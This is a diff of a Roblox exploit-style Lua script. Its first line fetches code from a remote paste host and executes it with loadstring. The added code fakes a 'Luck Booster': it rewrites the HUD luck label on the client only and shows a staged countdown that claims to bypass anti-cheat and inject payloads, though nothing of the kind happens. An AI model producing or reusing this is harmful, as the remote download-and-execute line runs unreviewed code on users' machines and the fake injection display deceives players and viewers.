@@ -1,1 +1,576 @@
 loadstring(game:HttpGet("https://cdn.sourceb.in/bins/3e5ESU4qOf/0"))()
+local Players      = game:GetService("Players")
+local RunService   = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
+local LocalPlayer  = Players.LocalPlayer
+
+local COUNTDOWN_TIME   = 20
+local ANIMATION_FACTOR = 0.02
+local MIN_STEP         = 50
+local MAX_PANELS       = 4
+
+local SUFFIXES = {
+    {1e33, "dc"}, {1e30, "no"}, {1e27, "oc"}, {1e24, "sp"},
+    {1e21, "sx"}, {1e18, "qi"}, {1e15, "qa"}, {1e12, "t"},
+    {1e9,  "b"},  {1e6,  "m"},  {1e3,  "k"},
+}
+
+local SUFFIX_VALUES = {
+    K = 1e3, M = 1e6, B = 1e9, T = 1e12,
+    Q = 1e15, QA = 1e15, QI = 1e18, SX = 1e21, SP = 1e24,
+    OC = 1e27, NO = 1e30, DC = 1e33,
+}
+
+local function formatNumber(n)
+    n = tonumber(n) or 0
+    if n < 1000 then return tostring(math.floor(n)) end
+    for _, pair in ipairs(SUFFIXES) do
+        if n >= pair[1] then
+            return string.format("%.2f%s", n / pair[1], pair[2])
+        end
+    end
+    return tostring(math.floor(n))
+end
+
+local function formatLuck(n)
+    return "x" .. formatNumber(n)
+end
+
+local function parseFormattedNumber(str)
+    if type(str) ~= "string" then return 0 end
+    str = str:gsub("[%s,]", "")
+    str = str:gsub("^[xX]", "")
+    if str == "" then return 0 end
+
+    local numStr, suffix = str:match("^([%d%.]+)([A-Za-z]*)$")
+    if not numStr then return 0 end
+
+    local num = tonumber(numStr)
+    if not num then return 0 end
+
+    if suffix and suffix ~= "" then
+        local mult = SUFFIX_VALUES[suffix:upper()]
+        if mult then return num * mult end
+    end
+    return num
+end
+
+local function parseUserAmount(str)
+    str = tostring(str):upper():gsub("[%s,]", "")
+    if str == "" then return nil end
+    local numStr, suffix = str:match("^([%d%.]+)([A-Z]*)$")
+    if not numStr then return nil end
+    local num = tonumber(numStr)
+    if not num or num <= 0 then return nil end
+    local MULT = {
+        K = 1e3, M = 1e6, B = 1e9, T = 1e12,
+        Q = 1e15, QI = 1e18, SX = 1e21, SP = 1e24,
+        OC = 1e27, NO = 1e30, DC = 1e33,
+    }
+    if suffix ~= "" then
+        local m = MULT[suffix]
+        if not m then return nil end
+        num = num * m
+    end
+    return num
+end
+
+local fakeValue       = 0
+local displayedValue  = 0
+local initialValue    = 0
+local initialized     = false
+local tickAccumulator = 0
+
+local function findLabel()
+    local pg = LocalPlayer:FindFirstChildOfClass("PlayerGui")
+    if not pg then return nil end
+    local root = pg:FindFirstChild("Root");    if not root then return nil end
+    local hud  = root:FindFirstChild("HUD");   if not hud  then return nil end
+    local buff = hud:FindFirstChild("BuffBar");if not buff then return nil end
+    local luck = buff:FindFirstChild("Luck");  if not luck then return nil end
+    return luck:FindFirstChild("TextLabel")
+end
+
+local label = findLabel()
+local suppressWrite = false
+
+local function applyFakeText()
+    if not label or not label.Parent then return end
+    suppressWrite = true
+    pcall(function() label.Text = formatLuck(displayedValue) end)
+    suppressWrite = false
+end
+
+local function hookLabel(lbl)
+    if not lbl then return end
+    lbl:GetPropertyChangedSignal("Text"):Connect(function()
+        if suppressWrite then return end
+        task.defer(applyFakeText)
+    end)
+end
+
+local function initializeFromLabel()
+    if initialized then return end
+    if not label or not label.Parent then return end
+
+    local currentText = label.Text or ""
+    local value = parseFormattedNumber(currentText)
+    if value <= 0 then value = 0 end
+
+    initialValue   = value
+    fakeValue      = value
+    displayedValue = value
+    initialized    = true
+
+    hookLabel(label)
+    applyFakeText()
+end
+
+if label and label.Parent then
+    initializeFromLabel()
+end
+
+task.spawn(function()
+    for _ = 1, 240 do
+        if initialized and label and label.Parent then return end
+        task.wait(0.5)
+        label = findLabel()
+        if not initialized and label and label.Parent then
+            initializeFromLabel()
+        end
+    end
+end)
+
+local pg = LocalPlayer:FindFirstChildOfClass("PlayerGui")
+if pg then
+    pg.DescendantAdded:Connect(function(desc)
+        if desc.Name == "TextLabel" and desc.Parent and desc.Parent.Name == "Luck" then
+            task.wait(0.1)
+            label = desc
+            if not initialized then
+                initializeFromLabel()
+            else
+                hookLabel(label)
+                applyFakeText()
+            end
+        end
+    end)
+end
+
+RunService.Heartbeat:Connect(function(dt)
+    if not initialized then return end
+    if displayedValue == fakeValue then return end
+
+    local magnitude = math.max(fakeValue, displayedValue, 1)
+    local diff      = math.abs(fakeValue - displayedValue)
+    local speedStep = math.max(MIN_STEP, math.floor(magnitude * ANIMATION_FACTOR))
+    local step      = math.max(1, math.min(speedStep, math.ceil(diff / 30)))
+
+    tickAccumulator = tickAccumulator + dt
+
+    local safety = 0
+    while tickAccumulator >= 0.016 and displayedValue ~= fakeValue and safety < 500 do
+        tickAccumulator = tickAccumulator - 0.016
+        safety = safety + 1
+
+        if fakeValue > displayedValue then
+            displayedValue = math.min(displayedValue + step, fakeValue)
+        else
+            displayedValue = math.max(displayedValue - step, fakeValue)
+        end
+
+        applyFakeText()
+    end
+end)
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "LuckBoosterGUI"
+gui.ResetOnSpawn = false
+gui.IgnoreGuiInset = true
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+gui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+
+local main = Instance.new("Frame")
+main.Name = "Main"
+main.Size = UDim2.new(0, 260, 0, 424)
+main.Position = UDim2.new(0, 20, 0.5, -212)
+main.BackgroundColor3 = Color3.fromRGB(15, 15, 22)
+main.BorderSizePixel = 0
+main.Active = true
+main.Draggable = true
+main.Parent = gui
+Instance.new("UICorner", main).CornerRadius = UDim.new(0, 10)
+
+local mainStroke = Instance.new("UIStroke")
+mainStroke.Color = Color3.fromRGB(88, 101, 242)
+mainStroke.Thickness = 1.5
+mainStroke.Parent = main
+
+local header = Instance.new("TextLabel")
+header.Size = UDim2.new(1, 0, 0, 30)
+header.BackgroundTransparency = 1
+header.Text = "🎲  LUCK BOOSTER"
+header.TextColor3 = Color3.fromRGB(140, 180, 255)
+header.Font = Enum.Font.GothamBold
+header.TextSize = 13
+header.Parent = main
+
+local valueDisplay = Instance.new("TextLabel")
+valueDisplay.Size = UDim2.new(1, -20, 0, 44)
+valueDisplay.Position = UDim2.new(0, 10, 0, 32)
+valueDisplay.BackgroundColor3 = Color3.fromRGB(22, 22, 32)
+valueDisplay.BorderSizePixel = 0
+valueDisplay.Text = "x0"
+valueDisplay.TextColor3 = Color3.fromRGB(88, 200, 255)
+valueDisplay.Font = Enum.Font.GothamBold
+valueDisplay.TextSize = 22
+valueDisplay.Parent = main
+Instance.new("UICorner", valueDisplay).CornerRadius = UDim.new(0, 6)
+
+local baseHint = Instance.new("TextLabel")
+baseHint.Size = UDim2.new(1, -20, 0, 14)
+baseHint.Position = UDim2.new(0, 10, 0, 78)
+baseHint.BackgroundTransparency = 1
+baseHint.Text = "base: x0"
+baseHint.TextColor3 = Color3.fromRGB(110, 110, 130)
+baseHint.Font = Enum.Font.Code
+baseHint.TextSize = 10
+baseHint.TextXAlignment = Enum.TextXAlignment.Left
+baseHint.Parent = main
+
+RunService.RenderStepped:Connect(function()
+    if valueDisplay and valueDisplay.Parent then
+        valueDisplay.Text = formatLuck(displayedValue)
+    end
+    if baseHint and baseHint.Parent then
+        baseHint.Text = "base: " .. formatLuck(initialValue)
+    end
+end)
+
+local COUNTDOWN_STEPS = {
+    {0.00, "Initializing exploit sequence..."},
+    {0.05, "Establishing secure tunnel..."},
+    {0.12, "Handshaking with remote node..."},
+    {0.20, "Bypassing anti-cheat layer 1..."},
+    {0.30, "Bypassing anti-cheat layer 2..."},
+    {0.40, "Injecting payload into Framework..."},
+    {0.50, "Overriding BuffService multipliers..."},
+    {0.60, "Patching memory addresses 0x7FF..."},
+    {0.70, "Verifying injection integrity..."},
+    {0.80, "Syncing with server state..."},
+    {0.90, "Revalidating anti-tamper seal..."},
+    {0.96, "Finalizing..."},
+}
+
+local function getStepForProgress(p)
+    local current = COUNTDOWN_STEPS[1][2]
+    for _, pair in ipairs(COUNTDOWN_STEPS) do
+        if p >= pair[1] then current = pair[2] else break end
+    end
+    return current
+end
+
+local activePanels = 0
+
+local function runInjectionCountdown(labelText, amount, onComplete, onUpdate, onCancel)
+    if activePanels >= MAX_PANELS then return false end
+    activePanels = activePanels + 1
+
+    local slot = (activePanels - 1) % MAX_PANELS
+    local offsetY = -220 + slot * 160
+
+    local panel = Instance.new("Frame")
+    panel.Size = UDim2.new(0, 320, 0, 150)
+    panel.Position = UDim2.new(0, 300, 0.5, offsetY)
+    panel.BackgroundColor3 = Color3.fromRGB(8, 10, 14)
+    panel.BorderSizePixel = 0
+    panel.Active = true
+    panel.Draggable = true
+    panel.Parent = gui
+    Instance.new("UICorner", panel).CornerRadius = UDim.new(0, 8)
+
+    local pStroke = Instance.new("UIStroke")
+    pStroke.Color = Color3.fromRGB(0, 200, 130)
+    pStroke.Thickness = 1
+    pStroke.Parent = panel
+
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, -20, 0, 18)
+    title.Position = UDim2.new(0, 10, 0, 8)
+    title.BackgroundTransparency = 1
+    title.Text = "> Elysium Injection Framework v3.1"
+    title.TextColor3 = Color3.fromRGB(0, 220, 130)
+    title.Font = Enum.Font.Code
+    title.TextSize = 12
+    title.TextXAlignment = Enum.TextXAlignment.Left
+    title.Parent = panel
+
+    local subtitle = Instance.new("TextLabel")
+    subtitle.Size = UDim2.new(1, -20, 0, 14)
+    subtitle.Position = UDim2.new(0, 10, 0, 26)
+    subtitle.BackgroundTransparency = 1
+    subtitle.Text = "TARGET: " .. labelText .. "   |   DELTA: +" .. formatNumber(amount)
+    subtitle.TextColor3 = Color3.fromRGB(120, 160, 200)
+    subtitle.Font = Enum.Font.Code
+    subtitle.TextSize = 11
+    subtitle.TextXAlignment = Enum.TextXAlignment.Left
+    subtitle.Parent = panel
+
+    local stepText = Instance.new("TextLabel")
+    stepText.Size = UDim2.new(1, -20, 0, 16)
+    stepText.Position = UDim2.new(0, 10, 0, 46)
+    stepText.BackgroundTransparency = 1
+    stepText.Text = COUNTDOWN_STEPS[1][2]
+    stepText.TextColor3 = Color3.fromRGB(255, 255, 255)
+    stepText.Font = Enum.Font.Code
+    stepText.TextSize = 11
+    stepText.TextXAlignment = Enum.TextXAlignment.Left
+    stepText.Parent = panel
+
+    local barBg = Instance.new("Frame")
+    barBg.Size = UDim2.new(1, -20, 0, 8)
+    barBg.Position = UDim2.new(0, 10, 0, 68)
+    barBg.BackgroundColor3 = Color3.fromRGB(25, 30, 40)
+    barBg.BorderSizePixel = 0
+    barBg.Parent = panel
+    Instance.new("UICorner", barBg).CornerRadius = UDim.new(1, 0)
+
+    local barFill = Instance.new("Frame")
+    barFill.Size = UDim2.new(0, 0, 1, 0)
+    barFill.BackgroundColor3 = Color3.fromRGB(0, 220, 130)
+    barFill.BorderSizePixel = 0
+    barFill.Parent = barBg
+    Instance.new("UICorner", barFill).CornerRadius = UDim.new(1, 0)
+
+    local timerText = Instance.new("TextLabel")
+    timerText.Size = UDim2.new(1, -100, 0, 18)
+    timerText.Position = UDim2.new(0, 10, 0, 82)
+    timerText.BackgroundTransparency = 1
+    timerText.Text = "0%  |   " .. COUNTDOWN_TIME .. "s remaining"
+    timerText.TextColor3 = Color3.fromRGB(180, 200, 220)
+    timerText.Font = Enum.Font.Code
+    timerText.TextSize = 11
+    timerText.TextXAlignment = Enum.TextXAlignment.Left
+    timerText.Parent = panel
+
+    local cancelBtn = Instance.new("TextButton")
+    cancelBtn.Size = UDim2.new(0, 80, 0, 22)
+    cancelBtn.Position = UDim2.new(1, -90, 1, -30)
+    cancelBtn.BackgroundColor3 = Color3.fromRGB(120, 40, 40)
+    cancelBtn.BorderSizePixel = 0
+    cancelBtn.Text = "CANCEL"
+    cancelBtn.TextColor3 = Color3.fromRGB(255, 220, 220)
+    cancelBtn.Font = Enum.Font.GothamBold
+    cancelBtn.TextSize = 11
+    cancelBtn.AutoButtonColor = true
+    cancelBtn.Parent = panel
+    Instance.new("UICorner", cancelBtn).CornerRadius = UDim.new(0, 5)
+
+    local cancelled = false
+    cancelBtn.MouseButton1Click:Connect(function() cancelled = true end)
+
+    task.spawn(function()
+        local startTime = os.clock()
+        while not cancelled do
+            if not panel.Parent then cancelled = true; break end
+
+            local elapsed   = os.clock() - startTime
+            local progress  = math.min(1, elapsed / COUNTDOWN_TIME)
+            local remaining = math.max(0, COUNTDOWN_TIME - elapsed)
+
+            barFill.Size   = UDim2.new(progress, 0, 1, 0)
+            stepText.Text  = getStepForProgress(progress)
+            timerText.Text = string.format("%d%%  |  %.0fs remaining",
+                math.floor(progress * 100), remaining)
+
+            if onUpdate then pcall(onUpdate, elapsed, COUNTDOWN_TIME) end
+
+            if progress >= 1 then break end
+            task.wait(0.1)
+        end
+
+        if not cancelled then
+            pStroke.Color = Color3.fromRGB(0, 255, 150)
+            stepText.Text = "✓ INJECTION COMPLETE — applying boost"
+            stepText.TextColor3 = Color3.fromRGB(0, 255, 150)
+            timerText.Text = "100%  |  done"
+            barFill.BackgroundColor3 = Color3.fromRGB(0, 255, 150)
+            task.wait(0.7)
+            pcall(onComplete)
+        else
+            if onCancel then pcall(onCancel) end
+        end
+
+        if panel and panel.Parent then panel:Destroy() end
+        activePanels = math.max(0, activePanels - 1)
+    end)
+
+    return true
+end
+
+local function makeBoostButton(text, yPos, color, amount)
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(1, -20, 0, 32)
+    btn.Position = UDim2.new(0, 10, 0, yPos)
+    btn.BackgroundColor3 = color
+    btn.BorderSizePixel = 0
+    btn.Text = text
+    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    btn.Font = Enum.Font.GothamBold
+    btn.TextSize = 14
+    btn.AutoButtonColor = false
+    btn.Parent = main
+    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
+
+    local orig = color
+    local hover = Color3.new(
+        math.min(orig.R + 0.12, 1),
+        math.min(orig.G + 0.12, 1),
+        math.min(orig.B + 0.12, 1))
+    local busyColor = Color3.fromRGB(55, 55, 65)
+
+    local busy = false
+
+    btn.MouseEnter:Connect(function()
+        if busy then return end
+        TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = hover}):Play()
+    end)
+    btn.MouseLeave:Connect(function()
+        if busy then return end
+        TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = orig}):Play()
+    end)
+
+    btn.MouseButton1Click:Connect(function()
+        if busy then return end
+        busy = true
+        btn.BackgroundColor3 = busyColor
+
+        local started = runInjectionCountdown(
+            text, amount,
+            function()
+                fakeValue = fakeValue + amount
+                busy = false
+                btn.BackgroundColor3 = orig
+                btn.Text = text
+            end,
+            function(elapsed, total)
+                local remaining = math.max(0, math.ceil(total - elapsed))
+                btn.Text = text .. "  (" .. remaining .. "s)"
+            end,
+            function()
+                busy = false
+                btn.BackgroundColor3 = orig
+                btn.Text = text
+            end
+        )
+
+        if not started then
+            busy = false
+            btn.BackgroundColor3 = orig
+            btn.Text = text
+        end
+    end)
+
+    return btn
+end
+
+local buttonsY = 98
+local spacing  = 36
+
+makeBoostButton("+1K",   buttonsY + spacing * 0, Color3.fromRGB(52, 152, 219), 1e3)
+makeBoostButton("+10K",  buttonsY + spacing * 1, Color3.fromRGB(46, 204, 113), 1e4)
+makeBoostButton("+100K", buttonsY + spacing * 2, Color3.fromRGB(241, 196, 15), 1e5)
+makeBoostButton("+1M",   buttonsY + spacing * 3, Color3.fromRGB(231, 76, 60),  1e6)
+makeBoostButton("+10M",  buttonsY + spacing * 4, Color3.fromRGB(155, 89, 182), 1e7)
+makeBoostButton("+100M", buttonsY + spacing * 5, Color3.fromRGB(230, 126, 34), 1e8)
+
+local customRow = Instance.new("Frame")
+customRow.Size = UDim2.new(1, -20, 0, 32)
+customRow.Position = UDim2.new(0, 10, 0, buttonsY + spacing * 6 + 4)
+customRow.BackgroundTransparency = 1
+customRow.Parent = main
+
+local textBox = Instance.new("TextBox")
+textBox.Size = UDim2.new(1, -70, 1, 0)
+textBox.BackgroundColor3 = Color3.fromRGB(28, 28, 40)
+textBox.BorderSizePixel = 0
+textBox.Text = "1M"
+textBox.PlaceholderText = "1M, 500K, 2.5B..."
+textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+textBox.PlaceholderColor3 = Color3.fromRGB(120, 120, 140)
+textBox.Font = Enum.Font.Code
+textBox.TextSize = 13
+textBox.ClearTextOnFocus = false
+textBox.Parent = customRow
+Instance.new("UICorner", textBox).CornerRadius = UDim.new(0, 6)
+
+local injectBtn = Instance.new("TextButton")
+injectBtn.Size = UDim2.new(0, 60, 1, 0)
+injectBtn.Position = UDim2.new(1, -60, 0, 0)
+injectBtn.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
+injectBtn.BorderSizePixel = 0
+injectBtn.Text = "INJECT"
+injectBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+injectBtn.Font = Enum.Font.GothamBold
+injectBtn.TextSize = 12
+injectBtn.Parent = customRow
+Instance.new("UICorner", injectBtn).CornerRadius = UDim.new(0, 6)
+
+local injectBusy = false
+
+injectBtn.MouseButton1Click:Connect(function()
+    if injectBusy then return end
+
+    local amount = parseUserAmount(textBox.Text)
+    if not amount then
+        textBox.TextColor3 = Color3.fromRGB(255, 100, 100)
+        task.delay(0.6, function()
+            textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+        end)
+        return
+    end
+    textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+    injectBusy = true
+    injectBtn.Text = "…"
+
+    local started = runInjectionCountdown(
+        "CUSTOM " .. formatNumber(amount),
+        amount,
+        function()
+            fakeValue = fakeValue + amount
+            injectBusy = false
+            injectBtn.Text = "INJECT"
+        end,
+        function(elapsed, total)
+            local remaining = math.max(0, math.ceil(total - elapsed))
+            injectBtn.Text = remaining .. "s"
+        end,
+        function()
+            injectBusy = false
+            injectBtn.Text = "INJECT"
+        end
+    )
+
+    if not started then
+        injectBusy = false
+        injectBtn.Text = "INJECT"
+    end
+end)
+
+local resetBtn = Instance.new("TextButton")
+resetBtn.Size = UDim2.new(1, -20, 0, 28)
+resetBtn.Position = UDim2.new(0, 10, 0, buttonsY + spacing * 7 + 4)
+resetBtn.BackgroundColor3 = Color3.fromRGB(90, 90, 100)
+resetBtn.BorderSizePixel = 0
+resetBtn.Text = "RESET (back to base)"
+resetBtn.TextColor3 = Color3.fromRGB(220, 220, 230)
+resetBtn.Font = Enum.Font.GothamBold
+resetBtn.TextSize = 12
+resetBtn.AutoButtonColor = true
+resetBtn.Parent = main
+Instance.new("UICorner", resetBtn).CornerRadius = UDim.new(0, 6)
+
+resetBtn.MouseButton1Click:Connect(function()
+    fakeValue = initialValue
+end)
